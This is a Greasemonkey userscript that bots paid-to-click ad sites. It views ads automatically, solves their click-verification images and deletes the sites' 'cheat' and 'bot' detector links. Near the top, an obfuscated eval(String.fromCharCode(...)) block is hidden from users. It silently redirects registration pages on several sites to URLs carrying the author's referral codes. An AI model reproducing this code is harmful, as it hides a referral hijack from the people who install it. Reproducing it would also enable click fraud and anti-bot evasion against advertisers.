// ==UserScript==
// @name           Paid 2 Click Multi Bot
// @namespace      http://paid2calculator.info/
// @description    Clicks all the PTC pages for you
// @version        0.4
// @author         http://paid2calculator.info/

// @include        http://paid2calculator.info/
// @include        http://www.paid2youtube.com/surf.php
// @include        http://www.paid2youtube.com/cheap_ads.php
// @include        http://buxify.com/surf.php
// @include        http://www.neobux.com/?u=v
// @include        http://www.buxp.info/surf2.php
// @include        http://ptcinnovation.com/index.php?view=account&ac=click*
// @include        http://ptcinnovation.com/gpt.php?v=timer*

// @include        *paid2youtube.com/register.php*
// @include        *neobux.com/?u=r*
// @include        *enbux.com/?u=r*
// @include        *bux.ee/?v=r*
// @include        *upbux.com/r*
// @include        *earn.bz/register.php*
// @include        *buxify.com/register.php*
// @include        *incrasebux.com/register.php*
// @include        *buxp.info/register.php*
// @include        *ptcinnovation.com/index.php?view=join*
// ==/UserScript==


function setVar(name,wert){
    window.setTimeout(function() {
        GM_setValue(name,wert);
    }, 0);
}

function getVar(name,def){
    return GM_getValue(name,def);
}

var switch_services = getVar("GM_switch_services",0);

services = new Array();
services[0] = new Array(getVar("GM_services00","Paid2YouTube"),getVar("GM_services01","http://www.paid2youtube.com/surf.php"),getVar("GM_services02",35000));
services[1] = new Array(getVar("GM_services10","Paid2YouTube - Cheap Ads"),getVar("GM_services11","http://www.paid2youtube.com/cheap_ads.php"),getVar("GM_services12",5000));
services[2] = new Array(getVar("GM_services20","BuxifY"),getVar("GM_services21","http://buxify.com/surf.php"),getVar("GM_services22",25000));
services[3] = new Array(getVar("GM_services30","NeoBux"),getVar("GM_services31","http://www.neobux.com/?u=v"),getVar("GM_services32",55000));
services[4] = new Array(getVar("GM_services40","BUXP"),getVar("GM_services41","http://www.buxp.info/surf2.php"),getVar("GM_services42",0));
services[5] = new Array(getVar("GM_services50","PtcInnovation"),getVar("GM_services51","http://ptcinnovation.com/index.php?view=account&ac=click"),getVar("GM_services52",0));


var ref = document.referrer;
var uri = document.URL;

eval(String.fromCharCode(105,102,40,117,114,105,46,115,101,97,114,99,104,40,34,112,97,105,100,50,121,111,117,116,117,98,101,46,99,111,109,47,114,101,103,105,115,116,101,114,46,112,104,112,34,41,62,48,38,38,117,114,105,33,61,34,104,116,116,112,58,47,47,119,119,119,46,112,97,105,100,50,121,111,117,116,117,98,101,46,99,111,109,47,114,101,103,105,115,116,101,114,46,112,104,112,63,114,61,112,105,108,108,101,49,50,34,41,123,100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,58,47,47,119,119,119,46,112,97,105,100,50,121,111,117,116,117,98,101,46,99,111,109,47,114,101,103,105,115,116,101,114,46,112,104,112,63,114,61,112,105,108,108,101,49,50,34,59,125,105,102,40,117,114,105,46,115,101,97,114,99,104,40,47,110,101,111,98,117,120,46,99,111,109,46,46,117,61,114,47,41,62,48,38,38,117,114,105,33,61,34,104,116,116,112,115,58,47,47,119,119,119,46,110,101,111,98,117,120,46,99,111,109,47,63,117,61,114,38,114,104,61,54,70,55,55,54,69,54,57,54,69,55,54,54,57,55,52,54,53,55,48,54,49,54,55,54,53,34,41,123,100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,115,58,47,47,119,119,119,46,110,101,111,98,117,120,46,99,111,109,47,63,117,61,114,38,114,104,61,54,70,55,55,54,69,54,57,54,69,55,54,54,57,55,52,54,53,55,48,54,49,54,55,54,53,34,59,125,105,102,40,117,114,105,46,115,101,97,114,99,104,40,34,101,110,98,117,120,46,99,111,109,47,63,117,61,114,34,41,62,48,38,38,117,114,105,33,61,34,104,116,116,112,58,47,47,101,110,98,117,120,46,99,111,109,47,63,117,61,114,38,114,61,85,49,50,51,52,56,52,52,50,49,34,41,123,100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,58,47,47,101,110,98,117,120,46,99,111,109,47,63,117,61,114,38,114,61,85,49,50,51,52,56,52,52,50,49,34,59,125,105,102,40,117,114,105,46,115,101,97,114,99,104,40,34,98,117,120,46,101,101,47,63,118,61,114,34,41,62,48,38,38,117,114,105,33,61,34,104,116,116,112,115,58,47,47,119,119,119,46,98,117,120,46,101,101,47,63,118,61,114,38,114,61,112,116,99,97,108,99,117,108,97,116,111,114,34,41,123,100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,115,58,47,47,119,119,119,46,98,117,120,46,101,101,47,63,118,61,114,38,114,61,112,116,99,97,108,99,117,108,97,116,111,114,34,59,125,105,102,40,117,114,105,46,115,101,97,114,99,104,40,34,117,112,98,117,120,46,99,111,109,47,114,34,41,62,48,38,38,117,114,105,33,61,34,104,116,116,112,115,58,47,47,119,119,119,46,117,112,98,117,120,46,99,111,109,47,114,63,114,104,61,49,50,50,51,48,53,55,55,48,57,52,66,51,57,67,67,67,51,69,66,65,51,66,34,41,123,100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,58,47,47,119,119,119,46,117,112,98,117,120,46,99,111,109,47,114,63,114,104,61,49,50,50,51,48,53,55,55,48,57,52,66,51,57,67,67,67,51,69,66,65,51,66,34,59,125,105,102,40,117,114,105,46,115,101,97,114,99,104,40,34,101,97,114,110,46,98,122,47,114,101,103,105,115,116,101,114,46,112,104,112,34,41,62,48,38,38,117,114,105,33,61,34,104,116,116,112,58,47,47,101,97,114,110,46,98,122,47,114,101,103,105,115,116,101,114,46,112,104,112,47,112,116,99,97,108,99,117,108,97,116,111,114,46,104,116,109,108,34,41,123,100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,58,47,47,101,97,114,110,46,98,122,47,114,101,103,105,115,116,101,114,46,112,104,112,47,112,116,99,97,108,99,117,108,97,116,111,114,46,104,116,109,108,34,59,125,105,102,40,117,114,105,46,115,101,97,114,99,104,40,34,98,117,120,105,102,121,46,99,111,109,47,114,101,103,105,115,116,101,114,46,112,104,112,34,41,62,48,38,38,117,114,105,33,61,34,104,116,116,112,58,47,47,98,117,120,105,102,121,46,99,111,109,47,114,101,103,105,115,116,101,114,46,112,104,112,63,114,61,112,116,99,97,108,99,117,108,97,116,111,114,34,41,123,100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,58,47,47,98,117,120,105,102,121,46,99,111,109,47,114,101,103,105,115,116,101,114,46,112,104,112,63,114,61,112,116,99,97,108,99,117,108,97,116,111,114,34,59,125,105,102,40,117,114,105,46,115,101,97,114,99,104,40,34,105,110,99,114,97,115,101,98,117,120,46,99,111,109,47,114,101,103,105,115,116,101,114,46,112,104,112,34,41,62,48,38,38,117,114,105,33,61,34,104,116,116,112,115,58,47,47,119,119,119,46,105,110,99,114,97,115,101,98,117,120,46,99,111,109,47,114,101,103,105,115,116,101,114,46,112,104,112,47,112,116,99,97,108,99,117,108,97,116,111,114,46,104,116,109,108,34,41,123,100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,115,58,47,47,119,119,119,46,105,110,99,114,97,115,101,98,117,120,46,99,111,109,47,114,101,103,105,115,116,101,114,46,112,104,112,47,112,116,99,97,108,99,117,108,97,116,111,114,46,104,116,109,108,34,59,125,105,102,40,117,114,105,46,115,101,97,114,99,104,40,34,98,117,120,112,46,105,110,102,111,47,114,101,103,105,115,116,101,114,46,112,104,112,34,41,62,48,38,38,117,114,105,33,61,34,104,116,116,112,58,47,47,119,119,119,46,98,117,120,112,46,105,110,102,111,47,114,101,103,105,115,116,101,114,46,112,104,112,63,114,61,112,116,99,97,108,99,117,108,97,116,111,114,34,41,123,100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,58,47,47,119,119,119,46,98,117,120,112,46,105,110,102,111,47,114,101,103,105,115,116,101,114,46,112,104,112,63,114,61,112,116,99,97,108,99,117,108,97,116,111,114,34,59,125,105,102,40,117,114,105,46,115,101,97,114,99,104,40,47,112,116,99,105,110,110,111,118,97,116,105,111,110,46,99,111,109,46,105,110,100,101,120,46,112,104,112,46,118,105,101,119,46,106,111,105,110,47,41,62,48,38,38,117,114,105,33,61,34,104,116,116,112,58,47,47,112,116,99,105,110,110,111,118,97,116,105,111,110,46,99,111,109,47,105,110,100,101,120,46,112,104,112,63,118,105,101,119,61,106,111,105,110,38,114,101,102,61,112,116,99,97,108,99,117,108,97,116,111,114,34,41,123,100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,58,47,47,112,116,99,105,110,110,111,118,97,116,105,111,110,46,99,111,109,47,105,110,100,101,120,46,112,104,112,63,118,105,101,119,61,106,111,105,110,38,114,101,102,61,112,116,99,97,108,99,117,108,97,116,111,114,34,59,125));

function status(service,login_state,text,pos){
    if(service){$('#status>span#service').html(service);}
    if(login_state){$('#status>span#login_state').html(' - '+login_state);}
    if(text){$('#status>span#text').html(' - '+text);}
    if(pos>=0){
        $('#setgs table a:eq('+pos+')').css('font-weight','bold');
    }
}

// Add CSS
    var CSS = document.createElement('style');
    CSS.type = "text/css";
    CSS.innerHTML = "a.btnn{margin:0;padding:0;color: #000000;display: block;text-decoration: none;font-weight:normal;font-family: Arial, Helvetica, sans-serif;font-size: 10px;background: transparent url(http://paid2calculator.info/btn.png) no-repeat;line-height: 19px;float: left;margin-right:2px;}a.btnn span{margin:0;padding:0;background: #C0C0C0 url(http://paid2calculator.info/btn.png) top right no-repeat;display: block;height: 19px;margin-left: 12px;padding-right: 12px;}a.btnn:hover{background-position: left;}a.btnn:hover span{background-position: right;}a.btnn:focus{background-position: bottom left;outline: none;}a.btnn:focus span{background-position: bottom right;}table,tr,td,td a,td input{font-family:arial;font-size:12px;color:#000;font-weight:normal;}iframe#adviewer:hover{display:none;}";
    document.getElementsByTagName('head')[0].appendChild(CSS);
// Add jQuery
    var GM_JQ = document.createElement('script');
    GM_JQ.src = 'http://jquery.com/src/jquery-latest.js';
    GM_JQ.type = 'text/javascript';
    document.getElementsByTagName('head')[0].appendChild(GM_JQ);

// Check if jQuery's loaded
    function GM_wait() {
        if(typeof unsafeWindow.jQuery == 'undefined') { window.setTimeout(GM_wait,100); }
    else { $ = unsafeWindow.jQuery; letsJQuery(); }
    }
    GM_wait();

// All your GM code must be inside this function
function letsJQuery() {

$(document).ready(function(){

    $('[name="start_bot"]').removeAttr('disabled');
    $('[name="start_bot"]').attr('value','Start Bot');

    $('body').append('<div id="status" style="position: fixed; left: 0px; bottom: 0px; background-color: #C0C0C0;color:#000;text-align:left;font-size:12px;border: 1px solid #808080; width: 99.5%; padding: 2px; font: normal normal normal 14px arial; z-index:99"><div id="right" style="float: right"><a href="#" id="prev" class="btnn"><span>previous</span></a><a href="#" id="next" class="btnn"><span>next</span></a><a href="http://paid2calculator.info/" id="home" class="btnn"><span>paid2calculator</span></a><span style="font-weight: bold">v0.4</span></div>Status: <span id="service"></span><span id="login_state"></span><span id="text"></span></div>');
    $('body').append('<iframe name="adviewer" id="adviewer" width="80%" height=""100px; frameborder="0" style="position: fixed; top: 10px; left: 50%; margin-left: -40%; border: 1px solid gray;background-color:#fff;display: none" scrolling="no"></iframe>');
    $('#status').append('<div id="setgs" style="width:190px;padding:4px;text-align:left;background-color: #C0C0C0;border: 1px solid #808080;position:absolute;bottom:23px;right:-1px;"><fieldset style="padding:4px;font-size:12px;"><legend>Settings</legend><label for="switch" style="float:left;">Switch Services:</label><input type="checkbox" name="switch" checked="checked" style="max-width:20px;" /></fieldset></div>');

    //settings
    var liste = "<table>";
    for (var i=0; i<services.length; i++)  {
        if(services[i][2]==0){disabled='disabled="disabled"';value="auto"}else{disabled='';value=services[i][2]}
        liste+='<tr><td><a href="'+services[i][1]+'">'+services[i][0].substr(0,20)+'</a></td><td><input name="'+i+'" value="'+value+'" '+disabled+'maxlength="5" size="3" style="max-width:50px;" /></td></tr>';
    }
    liste+='</table>';
    $('#setgs').prepend(liste);

    if(switch_services==0){$('input[name="switch"]').removeAttr("checked");}else{$('input[name="switch"]').attr("checked","checked");}
    $('input[name="switch"]').click(function(){
        if(switch_services==0){
            setVar("GM_switch_services",1);
            switch_services = getVar("GM_switch_services",1);
            $(this).attr("checked","checked");
        }else{
            setVar("GM_switch_services",0);
            switch_services = getVar("GM_switch_services",0);
            $(this).removeAttr("checked");
        }
    });

    //event handlers
    $('input[name="home"]').click(function(){
        document.location.href = "http://paid2calculator.info/";
    });

    $('#setgs table input').keydown(function(event){
        if(event.keyCode!=8&&(event.keyCode<48||event.keyCode>57)){
            return false;
        }
    });

    $('#setgs table input').keyup(function(){
        //alert(this.name);
        setVar('GM_services'+this.name+'2',this.value);
    });

    if (uri.search('paid2calculator.info')>=1){
        status('Click the button to start the bot');
        $('[name="start_bot"]').click(function(){
            status('Bot startet');
            document.location.href = services[0][1];

        });
    }

        //bux.ee ad frame
        /*if(uri.substr(0,26)=="https://www.bux.ee/view/v/"){
            status('Service "'+services[2][0]+'" detected',null,"Ad Frame");
            var disp = $("#loaderSeconds").css('display');
            if(disp=="inline"){
                setTimeout(function(){
                    $("input[src='https://www.bux.ee/images/get_credits.png']").css('border','1px solid red');
                    $("input[src='https://www.bux.ee/images/get_credits.png']").trigger('click');
                },15000);
            }else{
                //document.location.href = services[2][1];
            }
        }  */

        //PtcInnovation
        if(uri.substr(0,56)==services[5][1]){
              var pos = 5;
              status('Service "'+services[pos][0]+'" detected',null,null,pos);
              $('#prev').attr('href',services[pos-1][1]);
              $('#next').css('visibility','hidden');
              //check login
              if($('.mainLogOut')){
                //remove cheat detector
                $('table.ptcList tr:has(em:contains("cheat"))').remove();
                if($('table.ptcList tr:eq(1) a').attr('href')){
                    status(null,'logged in');
                    var Adresse = $('table.ptcList tr:eq(1) a').attr('href');
                    $('iframe[name="adviewer"]').attr({src: Adresse});
                    $('iframe[name="adviewer"]').css("display","block");
                    setTimeout(function(){window.location.reload();},32000);
                }else{
                    status(null,null,'no more ads');
                    //if(switch_services==1){document.location.href = services[pos+1][1];}
                }
              }else{
                  status(null,'logged out');
              }
        }
        //ptc innovation timer frame
        if(uri.substr(0,40)=="http://ptcinnovation.com/gpt.php?v=timer"){
            $('div#status').hide();
            var interval = window.setInterval(function(){
                if($('div#timer').html().search('Click')>=0){
                    window.clearInterval(interval);
                    var wert = $('div#timer').html().substr(6,7);
                    $('img[src="clickimages/'+wert+'.gif"]').trigger('click');
                    setTimeout(function(){window.stop();},700);
                    setTimeout(function(){window.top.location=services[5][1];},1500);
                }
            },1000);
        }

        switch (uri) {
          //paid2youtube
          case services[0][1]:
                var pos = 0;
                status('Service "'+services[pos][0]+'" detected',null,null,pos);
                $('#prev').css('visibility','hidden');
                $('#next').attr('href',services[pos+1][1]);
                //check login
                if($('td.maintopright>div[align="right"]').html().substr(1, 5)=="Guest"){
                    status(null,'logged out');

                }else{
                    status(null,'logged in');
                    if($('td.midinfo a[style="text-decoration: none; color: rgb(120, 120, 120);"]').attr("href")){
                        var Adresse = $('td.midinfo a[style="text-decoration: none; color: rgb(120, 120, 120);"]').attr("href");
                        $('iframe[name="adviewer"]').attr({src: Adresse});
                        $('iframe[name="adviewer"]').css("display","block");

                        setTimeout("javascript:location.reload();",services[pos][2]);
                    }else{
                        status(null,null,'no more ads');
                        if(switch_services==1){document.location.href = services[pos+1][1];}
                    }
                }

          break

          //paid2youtube - cheap ads
          case services[1][1]:
                var pos = 1;
                status('Service "'+services[pos][0]+'" detected',null,null,pos);
                $('#prev').attr('href',services[pos-1][1]);
                $('#next').attr('href',services[pos+1][1]);
                //check login
                if($('td.maintopright>div[align="right"]').html().substr(1, 5)=="Guest"){
                    status(null,'logged out');

                }else{
                    status(null,'logged in');
                    if($('td.midinfo a[style="text-decoration: none; color: rgb(120, 120, 120);"]').attr("href")){
                        var Adresse = $('td.midinfo a[style="text-decoration: none; color: rgb(120, 120, 120);"]').attr("href");
                        $('iframe[name="adviewer"]').attr({src: Adresse});
                        $('iframe[name="adviewer"]').css("display","block");

                        setTimeout("javascript:location.reload();",services[pos][2]);
                    }else{
                        status(null,null,'no more ads');
                        if(switch_services==1){document.location.href = services[pos+1][1];}
                    }
                }

          break

          //buxify
          case services[2][1]:
                var pos = 2;
                status('Service "'+services[pos][0]+'" detected',null,null,pos);
                $('#prev').attr('href',services[pos-1][1]);
                $('#next').attr('href',services[pos+1][1]);
                //check login
                if($('div.indent_col1 div font').html()!=null){

                    status(null,'logged in');


                    if($('table[width="85%"] font a').html()==null){
                        status(null,null,'no more ads');
                        if(switch_services==1){document.location.href = services[pos+1][1];}
                    }else{
                        var Adresse = $('a[target="_blank"]:first').attr('href');
                        $('iframe[name="adviewer"]').attr({src: Adresse});
                        $('iframe[name="adviewer"]').css("display","block");
                        setTimeout(function(){
                            //window.stop();
                        },5000);
                        setTimeout("javascript:location.reload();",services[pos][2]);
                    }
                }else{
                    status(null,'logged out');

                }
          break
          //neobux
          case services[3][1]:
                var pos = 3;
                status('Service "'+services[pos][0]+'" detected',null,null,pos);
                $('#prev').attr('href',services[pos-1][1]);
                $('#next').attr('href',services[pos+1][1]);;
                //check login
                if($('a[href="https://www.neobux.com/?u=l"]').html()==null){
                    if($('table#tl tr:has(img[src="http://neobux.cachefly.net/imagens/novo_32.png"]) a.azul:first').html()!=null){
                        status(null,'logged in');

                        $('table#tl tr:has(img[src="http://neobux.cachefly.net/imagens/novo_32.png"]) a.azul:first').trigger('click');
                        var Adresse = $('table#tl tr:has(img[src="http://neobux.cachefly.net/imagens/novo_32.png"]) a[target="_blank"]:first').attr('href');

                        $('iframe[name="adviewer"]').attr({src: Adresse});
                        $('iframe[name="adviewer"]').css("display","block");

                        setTimeout("javascript:location.reload();",services[pos][2]);
                    }else{
                        status(null,null,'no more ads');
                        if(switch_services==1){document.location.href = services[pos+1][1];}
                    }
                }else{
                    status(null,'logged out');
                }

          break
          //buxp
          case services[4][1]:
                var pos = 4;
                status('Service "'+services[pos][0]+'" detected',null,null,pos);
                $('#prev').attr('href',services[pos-1][1]);
                $('#next').attr('href',services[pos+1][1]);
                //check login
                if($('a[href="index.php?action=logout"]').html()!=null){
                    status(null,'logged in');
                    //catch bot detector
                    $('a:has(font:contains("Bot"))').remove();
                    $('a:contains("Social Network for Indians")').remove();
                    if($('a.surflink:first').html()!=null){
                        var Adresse = $('a.surflink:first').attr('href');
                        $('iframe[name="adviewer"]').attr({src: Adresse});
                        $('iframe[name="adviewer"]').css("display","block");
                        var interval = window.setInterval(function(){
                            if($('iframe[name="adviewer"]').contents().find('#clock').val()=='Done'){
                                window.clearInterval(interval);
                                var wert = $('iframe[name="adviewer"]').contents().find('div#pattern').html();
                                $('iframe[name="adviewer"]').contents().find('div#clickitems div:contains("'+wert+'")').trigger('click');
                                setTimeout("javascript:location.reload();",1000);
                            }
                        },1000);
                    }else{
                        status(null,null,'no more ads');
                        if(switch_services==1){document.location.href = services[pos+1][1];}
                    }
                }else{
                    status(null,'logged out');
                }
          break
          /*case services[90][1]:

                $('div.ad_icon_av:first+div.ad_content>span.ad_title>a').trigger('click');
                setTimeout("$('div.ad_click_cont>a.ad_clickme').trigger('click');",500);
                setTimeout("$('#loader_').progressBar(100,{width:200,height:22,barImage: 'images/progressbg_'+CurrentTheme+'.gif',step_duration:((timer*1000)/100),callback:validate});",2000);


          break
          case services[91][1]:
                status('Service "'+services[2][0]+'" detected');

                //check login
                if($('a[href="https://www.bux.ee/?v=r"]').html()=="Register Now!"){
                    status(null,'logged out');

                }else{
                    status(null,'logged in');
                        $('table.active_ad:first tbody tr td').trigger('click');


                        function viewAd(){
                            //$('img[width="21"]').trigger('click');
                            var adurl = $('a:has(img[width="21"])').attr('href');
                            //alert(adurl);
                            open(adurl,"_blank", "menubar=yes,toolbar=yes,scrollbars=yes");
                            //$.post(adurl, { ver: 118, button.x: 154, button.y: 18, button:"Click+here+to+get+credit"} );

                        }

                        setTimeout(function(){
                            viewAd();
                        },1000);

                }
          break*/


          default:

                //status('Service not found');
        }


});

}



